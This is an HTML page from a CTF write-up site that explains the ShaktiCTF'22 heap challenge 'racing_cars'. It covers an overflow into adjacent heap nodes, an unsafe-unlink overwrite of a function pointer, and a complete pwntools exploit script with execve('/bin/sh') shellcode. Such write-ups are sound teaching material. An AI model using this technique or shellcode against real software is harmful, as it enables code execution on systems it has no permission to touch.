@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/pwn/racing_cars/writeup/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>racing_cars - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+            <div class="container">
+
+                <!-- Collapsed navigation -->
+                <div class="navbar-header">
+                    <!-- Expander button -->
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                </div>
+
+                <!-- Expanded navigation -->
+                <div class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li >
+                                <a href="../../../../about/">About Us</a>
+                            </li>
+                            <li >
+                                <a href="../../../../shaktictf/">ShaktiCTF</a>
+                            </li>
+                            <li >
+                                <a href="https://team-shakti.github.io/">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/racing_cars/writeup.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#racing_cars">racing_cars</a></li>
+            <li><a href="#preliminary-checks">Preliminary Checks:</a></li>
+            <li><a href="#understanding-the-challenge">Understanding the challenge</a></li>
+            <li><a href="#exploitation">Exploitation:</a></li>
+            <li><a href="#exploit">Exploit</a></li>
+    </ul>
+</div></div>
+                <div class="col-md-9" role="main">
+
+<h1 id="racing_cars">racing_cars</h1>
+<p>Author: <a href="https://twitter.com/BhaskaraShravya">d1g174l_f0rtr355</a></p>
+<p>Solves: 2</p>
+<p>Difficulty: Medium</p>
+<p>This is one of the heap challenges I made for ShaktiCTF'22. The binary provided is a stripped binary, making it difficult. However useful decompilers such as Ghidra/ IDA make it easy to debug and decompile. </p>
+<h2 id="preliminary-checks">Preliminary Checks:</h2>
+<p>We observe that the binary given is a 32 bit stripped binary with the following cheks enabled and disabled:</p>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre>
+
+<p>One key security check to note here is that the NX bit is disabled. This makes it easy for us to inject a shellcode and execute it. However the question is how?</p>
+<h2 id="understanding-the-challenge">Understanding the challenge</h2>
+<p>For the purpose of understanding, let's take a look at the source code which was also released during the CTF.</p>
+<p>We notice a few things such as:
+- structure node: This node contains an interger <code>id</code>, a char <code>buffer</code> and two other nodes pointers namely, <code>next</code>, and <code>prev</code>. 
+  <code>struct node{
+    int id;
+    char buffer[32];
+    struct node* next;
+    struct node* prev;
+  };</code>
+- insert: Here, the node <code>temp</code> is a pointer that contaoins the malloced chunk. The size allocated is 0x30 bytes, as can be seen in GDB (set a break point at <code>0x8049391</code> where malloc() is called, and check the heap address present in the eax register after calling malloc()). We also observe that the pointer to the next chunk of the current chunk is nulled out. This function is responsible for inserting the current node onto the heap. 
+  <code>int insert(int id){
+    struct node *temp = malloc(sizeof(struct node));
+    temp-&gt;next = NULL;
+    temp-&gt;id = id;
+    if(head==NULL){
+        head = temp;
+        head-&gt;prev = NULL;
+        return 1;
+    }
+    struct node *iter = head;
+    while(iter-&gt;next != NULL){
+        iter = iter-&gt;next;
+    }
+    iter-&gt;next = temp;
+    temp-&gt;prev = iter;
+    return 1;
+  }</code>
+  <code>pwndbg&gt; x/20x 0x804d1a0-0x8
+  0x804d198:    0x00000000  0x00000031  0x00000000  0x00000000
+  0x804d1a8:    0x00000000  0x00000000  0x00000000  0x00000000
+  0x804d1b8:    0x00000000  0x00000000  0x00000000  0x00000000
+  0x804d1c8:    0x00000000  0x00021e39  0x00000000  0x00000000
+  0x804d1d8:    0x00000000  0x00000000  0x00000000  0x00000000
+  pwndbg&gt;</code>
+- delete: This function is responsible for freeing an allocated chunk. The freeing process is similar to that in unlink where upon freeing a current chunk, its forward and backward pointers point to the current chunk's forward and backward chunks.
+   <code>int delete(int id){
+    struct node *temp = head;
+    while(temp-&gt;id != id &amp;&amp; temp-&gt;next != NULL)
+        temp = temp-&gt;next;
+    if(temp==NULL)
+        return 0;
+    if(temp-&gt;next == NULL)
+        temp-&gt;prev-&gt;next = NULL;
+    if(temp-&gt;prev == NULL)
+        temp-&gt;next-&gt;prev = NULL;
+    if(temp-&gt;next != NULL &amp;&amp; temp-&gt;prev != NULL){
+        temp-&gt;prev-&gt;next = temp-&gt;next;
+        temp-&gt;next-&gt;prev = temp-&gt;prev;
+    }
+    free(temp);
+    return 0;
+  }</code>
+- main: Here we see an input taken into the global variable array with our input size being 50. This is where we shall place our shellcode for program redirection. Further we see that 3 chunks are being allocated on heap (through insert()). The chunks are read from the get_name() function where we observe the overflow happening. The order the chunks are being read in and the index of the chunk which is deleted is of importance to check.</p>
+<pre><code>    printf(&quot;\nChoose your car: &quot;);
+
+    fgets(array,50,stdin);
+
+    for(i=0;i&lt;3;i++){
+
+        insert(i);
+    }
+
+    printf(&quot;\nEnter your details before you begin the race\nName: &quot;);
+    get_name(0);
+
+    printf(&quot;\nOccupation: &quot;);
+    get_name(2);
+
+    printf(&quot;\nAddress: &quot;);
+    get_name(1);
+
+    delete(1);
+
+    (*function_pointer)();
+    return 0;
+</code></pre>
+
+<ul>
+<li>get_name(): This is the function called when we have to read data into the allocated chunks on the heap. The order in which the chunks are read are <code>0 2 1</code>. This is important as we can cause an overflow from chunk <code>1</code> to chunk <code>2</code>, overwrite the <code>function_ptr</code> with the address of <code>array</code> where we have our shellcode into. As we can see from the code below, the allocated chunk size is only <code>0x30</code> bytes, whereas we are reading <code>0x100</code> bytes of input data. </li>
+</ul>
+<pre><code>    struct node *temp = head;
+    while(temp-&gt;id != id &amp;&amp; temp-&gt;next != NULL)
+        temp = temp-&gt;next;
+    if(temp==NULL)
+        return 0;
+    fgets(temp-&gt;buffer,0x100,stdin);
+    return 0;
+</code></pre>
+
+<h2 id="exploitation">Exploitation:</h2>
+<p>To understand the overwrite using the <code>unsafe-unlink</code> technique in heap, we shall take a look at the structure node below:</p>
+<pre><code>struct node{
+    int id;
+    char buffer[32];
+    struct node* next;
+    struct node* prev;
+};
+</code></pre>
+
+<p>In the above section of code, we observe that the <code>next</code> and the <code>prev</code> nodes in the struct are right after buffer of size 32 bytes (or 0x20 bytes). </p>
+<p>The code that is used to remove chunk from its bin is implemented as a macro called <code>unlink</code> and looks something like:</p>
+<pre><code>#define unlink(P, BK, FD) { \
+    FD = P-&gt;fd;  \
+    BK = P-&gt;bk;  \
+    FD-&gt;bk = BK; \
+    BK-&gt;fd = FD; \
+}
+</code></pre>
+
+<p>This is pretty standard code for removing an element from a doubly-linked list.</p>
+<p>What happens when there's a buffer overflow on the heap? In this case, the attacker is able to overwrite some metadata from the next chunk. When the current chunk is freed, the malicious metadata will be used to trick the heap manager into performing unintended actions.</p>
+<p>Keeping in mind how the unsafe-unlinking works, we overwrite <code>next</code> with <code>function_ptr-0x28</code> and <code>prev</code> with <code>array</code>. Here we subtract 0x28 from the address of <code>function_ptr</code> due to the 0x20 buffer + 4 bytes of <code>next</code> and <code>4</code> bytes of <code>prev</code> pointer addresses. </p>
+<p>We shall fill the 0th chunk with a few 'a's. The 2nd chunk with a few 'c's, and use the heap overflow to overwrite the <code>function_ptr</code> with <code>array</code>. Hence when the <code>function_ptr</code> function is called next, our shellcode gets executed instead.</p>
+<p>For that we need to construct our payload:</p>
+<pre><code>pay = 'b'*0x20
+pay += p32(function_ptr - 0x28)
+pay += p32(array)
+pay += p32(0x65)
+</code></pre>
+
+<p>Below is the GDB-dump of the heap at this point!</p>
+<pre><code>pwndbg&gt; x/20x 0x8ad11a0-0x8
+0x8ad1198:  0x00000000  0x00000031  0x00000000  0x61616161
+0x8ad11a8:  0x61616161  0x61616161  0x61616161  0x0000000a
+0x8ad11b8:  0x00000000  0x00000000  0x00000000  0x08ad11d0
+0x8ad11c8:  0x00000000  0x00000031  0x00000001  0x62626262
+0x8ad11d8:  0x62626262  0x62626262  0x62626262  0x62626262
+pwndbg&gt; 
+0x8ad11e8:  0x62626262  0x62626262  0x62626262  0x0804c01c
+0x8ad11f8:  0x0804c080  0x00000065  0x0000000a  0x63636363
+0x8ad1208:  0x63636363  0x63636363  0x63636363  0x0000000a
+0x8ad1218:  0x00000000  0x00000000  0x00000000  0x00000000
+0x8ad1228:  0x08ad11d0  0x00021dd9  0x00000000  0x00000000
+</code></pre>
+
+<p>The unlinking takes place as desired, the <code>next</code> and <code>prev</code> pointers in the structure get overwritten. In this way, the <code>function_ptr</code> also gets overwritten to point to the global address of <code>array</code> where the shellcode is stotred.</p>
+<h2 id="exploit">Exploit</h2>
+<pre><code>def shellcode():
+    shell = 'xor ecx, ecx\n'
+    shell += 'xor edx, edx\n'
+    shell += 'push eax\n'
+    shell += 'push 0x68732f\n'
+    shell += 'push 0x6e69622f\n'
+    shell += 'mov ebx, esp\n'
+    shell += 'push 0xb\n'
+    shell += 'pop eax\n'
+    shell += 'int 0x80\n'
+
+    return asm(shell)
+
+from pwn import *
+
+p = process('./racing_cars')
+exe = ELF('./racing_cars')
+gdb.attach(p, gdbscript='b*0x0804971c\n')
+#p = remote('65.2.136.80', 32645)
+p.sendlineafter('Choose your car: ', shellcode())
+
+p.sendlineafter('Name: ', 'a'*0x10)
+p.sendlineafter('Occupation: ', 'c'*0x10)
+
+function_ptr = 0x804c044
+arr = 0x804c080
+
+pay = 'b'*0x20
+pay += p32(function_ptr - 0x28)
+pay += p32(arr)
+pay += p32(0x65)
+p.sendlineafter('Address: ', pay)
+
+p.interactive()
+</code></pre></div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../../..",
+                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+        </script>
+        <script src="../../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
+            </div>
+            <div class="modal-body">
+                <p>
+                    From here you can search these documents. Enter
+                    your search terms below.
+                </p>
+                <form role="form">
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
